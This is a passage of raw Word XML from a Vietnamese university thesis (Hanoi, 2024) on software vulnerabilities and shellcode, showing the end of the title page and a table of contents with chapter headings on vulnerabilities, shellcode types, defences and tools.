                  <w:pPr>
                    <w:pStyle w:val="TrangBa"/>
                    <w:tabs>
                      <w:tab w:val="left" w:pos="1134"/>
                      <w:tab w:val="left" w:pos="1701"/>
                    </w:tabs>
                    <w:spacing w:line="312" w:lineRule="auto"/>
                    <w:jc w:val="left"/>
                    <w:rPr>
                      <w:rFonts w:cs="Times New Roman"/>
                    </w:rPr>
                  </w:pPr>
                  <w:r>
                    <w:rPr>
                      <w:rFonts w:cs="Times New Roman"/>
                    </w:rPr>
                    <w:t>AT150539</w:t>
                  </w:r>
                </w:p>
              </w:tc>
            </w:tr>
          </w:tbl>
          <w:p w14:paraId="02E105E3" w14:textId="1516CA92" w:rsidR="00C3420A" w:rsidRDefault="00C3420A" w:rsidP="000B08BE">
            <w:pPr>
              <w:pStyle w:val="TrangBa"/>
              <w:tabs>
                <w:tab w:val="left" w:pos="1134"/>
                <w:tab w:val="left" w:pos="1701"/>
              </w:tabs>
              <w:spacing w:line="312" w:lineRule="auto"/>
              <w:jc w:val="left"/>
              <w:rPr>
                <w:rFonts w:cs="Times New Roman"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="0DAB79BC" w14:textId="5C2A5559" w:rsidR="00C3420A" w:rsidRPr="00013FB7" w:rsidRDefault="00C3420A" w:rsidP="00AD3CAA">
            <w:pPr>
              <w:pStyle w:val="TrangBa"/>
              <w:tabs>
                <w:tab w:val="left" w:pos="1134"/>
                <w:tab w:val="left" w:pos="1701"/>
              </w:tabs>
              <w:spacing w:line="312" w:lineRule="auto"/>
              <w:jc w:val="left"/>
              <w:rPr>
                <w:rFonts w:cs="Times New Roman"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:cs="Times New Roman"/>
              </w:rPr>
              <w:t xml:space="preserve">                 </w:t>
            </w:r>
            <w:r w:rsidR="00421775" w:rsidRPr="00421775">
              <w:rPr>
                <w:rFonts w:cs="Times New Roman"/>
                <w:i/>
                <w:iCs/>
              </w:rPr>
              <w:t>Người</w:t>
            </w:r>
            <w:r w:rsidRPr="00C81D12">
              <w:rPr>
                <w:rFonts w:cs="Times New Roman"/>
                <w:i/>
              </w:rPr>
              <w:t xml:space="preserve"> hướng dẫn</w:t>
            </w:r>
            <w:r w:rsidRPr="00C81D12">
              <w:rPr>
                <w:rFonts w:cs="Times New Roman"/>
              </w:rPr>
              <w:t>:</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="24961E4C" w14:textId="2F40DEE3" w:rsidR="00C3420A" w:rsidRPr="00C81D12" w:rsidRDefault="00C3420A" w:rsidP="000B08BE">
            <w:pPr>
              <w:pStyle w:val="TrangBa"/>
              <w:tabs>
                <w:tab w:val="left" w:pos="1134"/>
              </w:tabs>
              <w:spacing w:line="312" w:lineRule="auto"/>
              <w:ind w:left="1687"/>
              <w:jc w:val="left"/>
              <w:rPr>
                <w:rFonts w:cs="Times New Roman"/>
                <w:b/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00C81D12">
              <w:rPr>
                <w:rFonts w:cs="Times New Roman"/>
                <w:b/>
              </w:rPr>
              <w:t xml:space="preserve">ThS. </w:t>
            </w:r>
            <w:r w:rsidR="000B08BE">
              <w:rPr>
                <w:rFonts w:cs="Times New Roman"/>
                <w:b/>
              </w:rPr>
              <w:t>Lê Anh Tú</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2E150F72" w14:textId="77777777" w:rsidR="00C3420A" w:rsidRDefault="00C3420A" w:rsidP="00AD3CAA">
            <w:pPr>
              <w:pStyle w:val="TrangBa"/>
              <w:spacing w:line="312" w:lineRule="auto"/>
              <w:jc w:val="both"/>
              <w:rPr>
                <w:rFonts w:cs="Times New Roman"/>
                <w:sz w:val="36"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="78FE46FA" w14:textId="77777777" w:rsidR="00C3420A" w:rsidRPr="008372B2" w:rsidRDefault="00C3420A" w:rsidP="00AD3CAA">
            <w:pPr>
              <w:pStyle w:val="TrangBa"/>
              <w:spacing w:line="312" w:lineRule="auto"/>
              <w:jc w:val="both"/>
              <w:rPr>
                <w:rFonts w:cs="Times New Roman"/>
                <w:sz w:val="36"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="4DF5D85C" w14:textId="0D4F73E3" w:rsidR="00C3420A" w:rsidRPr="00F609FE" w:rsidRDefault="00C3420A" w:rsidP="00AD3CAA">
            <w:pPr>
              <w:pStyle w:val="TrangBa"/>
              <w:spacing w:line="312" w:lineRule="auto"/>
              <w:rPr>
                <w:rFonts w:cs="Times New Roman"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00C81D12">
              <w:rPr>
                <w:rFonts w:cs="Times New Roman"/>
              </w:rPr>
              <w:t>Hà Nội,</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:cs="Times New Roman"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="00C81D12">
              <w:rPr>
                <w:rFonts w:cs="Times New Roman"/>
              </w:rPr>
              <w:t>202</w:t>
            </w:r>
            <w:r w:rsidR="000B08BE">
              <w:rPr>
                <w:rFonts w:cs="Times New Roman"/>
              </w:rPr>
              <w:t>4</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="3ED8AC3B" w14:textId="6C91BAE3" w:rsidR="006D5DF8" w:rsidRDefault="006D5DF8"/>
    <w:p w14:paraId="4F43E655" w14:textId="4C101DA3" w:rsidR="008A7EEE" w:rsidRDefault="008A7EEE" w:rsidP="0053047C">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5E57D6E0" w14:textId="0EBBA209" w:rsidR="004A113F" w:rsidRPr="0053047C" w:rsidRDefault="004A113F" w:rsidP="006A06DE">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="284"/>
        <w:rPr>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="1" w:name="_Toc185277760"/>
      <w:r w:rsidRPr="0053047C">
        <w:t>MỤC LỤC</w:t>
      </w:r>
      <w:bookmarkEnd w:id="1"/>
    </w:p>
    <w:p w14:paraId="4800138D" w14:textId="327BC344" w:rsidR="00746169" w:rsidRDefault="00D94422" w:rsidP="00746169">
      <w:pPr>
        <w:pStyle w:val="TOC1"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w14:ligatures w14:val="standardContextual"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r>
        <w:instrText xml:space="preserve"> TOC \o "1-3" \h \z \u </w:instrText>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:hyperlink w:anchor="_Toc185277760" w:history="1">
        <w:r w:rsidR="00746169" w:rsidRPr="00B24740">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
          </w:rPr>
          <w:t>MỤC LỤC</w:t>
        </w:r>
        <w:r w:rsidR="00746169">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidR="00746169">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="00746169">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGEREF _Toc185277760 \h </w:instrText>
        </w:r>
        <w:r w:rsidR="00746169">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
        </w:r>
        <w:r w:rsidR="00746169">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r w:rsidR="00746169">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:t>2</w:t>
        </w:r>
        <w:r w:rsidR="00746169">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="45FAE9B4" w14:textId="532CCDA3"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61" w:history="1">
        <w:r w:rsidRPr="00B24740">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
          </w:rPr>
          <w:t>DANH MỤC HÌNH VẼ</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGEREF _Toc185277761 \h </w:instrText>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:t>i</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="45E4844B" w14:textId="6E694B05"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62" w:history="1">
        <w:r w:rsidRPr="00B24740">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
          </w:rPr>
          <w:t>LỜI NÓI ĐẦU</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGEREF _Toc185277762 \h </w:instrText>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:t>iii</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="6AB40C48" w14:textId="7CCCDCB2"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63" w:history="1">
        <w:r w:rsidRPr="00B24740">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
          </w:rPr>
          <w:t>CHƯƠNG 1. CƠ SỞ LÝ THUYẾT</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGEREF _Toc185277763 \h </w:instrText>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:t>1</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="18481A99" w14:textId="709410E4" w:rsidR="00746169" w:rsidRDefault="00746169">
      <w:pPr>
        <w:pStyle w:val="TOC2"/>
        <w:tabs>
          <w:tab w:val="right" w:leader="dot" w:pos="9059"/>
        </w:tabs>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:noProof/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w14:ligatures w14:val="standardContextual"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink w:anchor="_Toc185277764" w:history="1">
        <w:r w:rsidRPr="00B24740">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
          </w:rPr>
          <w:t>1.1 Tổng quan về lỗ hổng phần mềm</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGEREF _Toc185277764 \h </w:instrText>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:t>1</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="21311D66" w14:textId="3581284A" w:rsidR="00746169" w:rsidRDefault="00746169">
      <w:pPr>
        <w:pStyle w:val="TOC3"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w14:ligatures w14:val="standardContextual"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink w:anchor="_Toc185277765" w:history="1">
        <w:r w:rsidRPr="00B24740">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
          </w:rPr>
          <w:t>1.1.1 Lỗ hổng bảo mật</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGEREF _Toc185277765 \h </w:instrText>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:t>1</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="7441A645" w14:textId="707628DA" w:rsidR="00746169" w:rsidRDefault="00746169">
      <w:pPr>
        <w:pStyle w:val="TOC3"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w14:ligatures w14:val="standardContextual"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink w:anchor="_Toc185277766" w:history="1">
        <w:r w:rsidRPr="00B24740">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
          </w:rPr>
          <w:t>1.1.2 Nguyên nhân gây ra lỗ hổng</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGEREF _Toc185277766 \h </w:instrText>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:t>2</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="1594AB91" w14:textId="317CBD73" w:rsidR="00746169" w:rsidRDefault="00746169">
      <w:pPr>
        <w:pStyle w:val="TOC3"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w14:ligatures w14:val="standardContextual"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink w:anchor="_Toc185277767" w:history="1">
        <w:r w:rsidRPr="00B24740">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
          </w:rPr>
          <w:t>1.1.3 Các phương thức đảm bảo an toàn thông tin cho hệ thống</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGEREF _Toc185277767 \h </w:instrText>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:t>4</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="03868EF4" w14:textId="10481E1E" w:rsidR="00746169" w:rsidRDefault="00746169">
      <w:pPr>
        <w:pStyle w:val="TOC2"/>
        <w:tabs>
          <w:tab w:val="right" w:leader="dot" w:pos="9059"/>
        </w:tabs>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:noProof/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w14:ligatures w14:val="standardContextual"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink w:anchor="_Toc185277768" w:history="1">
        <w:r w:rsidRPr="00B24740">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
          </w:rPr>
          <w:t>1.2 Tổng quan về Shellcode</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGEREF _Toc185277768 \h </w:instrText>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:t>4</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="5C26DFBC" w14:textId="7DAA8122" w:rsidR="00746169" w:rsidRDefault="00746169">
      <w:pPr>
        <w:pStyle w:val="TOC3"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w14:ligatures w14:val="standardContextual"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink w:anchor="_Toc185277769" w:history="1">
        <w:r w:rsidRPr="00B24740">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
          </w:rPr>
          <w:t>1.2.1 Khái niệm về shellcode</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGEREF _Toc185277769 \h </w:instrText>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:t>4</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="5A6218DF" w14:textId="1EC96EA6" w:rsidR="00746169" w:rsidRDefault="00746169">
      <w:pPr>
        <w:pStyle w:val="TOC3"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w14:ligatures w14:val="standardContextual"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink w:anchor="_Toc185277770" w:history="1">
        <w:r w:rsidRPr="00B24740">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
          </w:rPr>
          <w:t>1.2.2 Phân loại shellcode</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGEREF _Toc185277770 \h </w:instrText>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:t>5</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="0060FA3C" w14:textId="308762E8" w:rsidR="00746169" w:rsidRDefault="00746169">
      <w:pPr>
        <w:pStyle w:val="TOC3"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w14:ligatures w14:val="standardContextual"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink w:anchor="_Toc185277771" w:history="1">
        <w:r w:rsidRPr="00B24740">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
          </w:rPr>
          <w:t>1.2.3 Bảo mật và Phòng chống Shellcode</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGEREF _Toc185277771 \h </w:instrText>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:t>6</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="236C6D65" w14:textId="24B94B5E" w:rsidR="00746169" w:rsidRDefault="00746169">
      <w:pPr>
        <w:pStyle w:val="TOC3"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w14:ligatures w14:val="standardContextual"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink w:anchor="_Toc185277772" w:history="1">
        <w:r w:rsidRPr="00B24740">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
          </w:rPr>
          <w:t>1.2.4 Các công cụ phổ biến liên quan đến Shellcode</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGEREF _Toc185277772 \h </w:instrText>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:t>7</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="11AD8BDF" w14:textId="6D2AF719"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73" w:history="1">
        <w:r w:rsidRPr="00B24740">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
          </w:rPr>
          <w:t>CHƯƠNG 2. NGHIÊN CỨU VỀ LỖ HỔNG</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
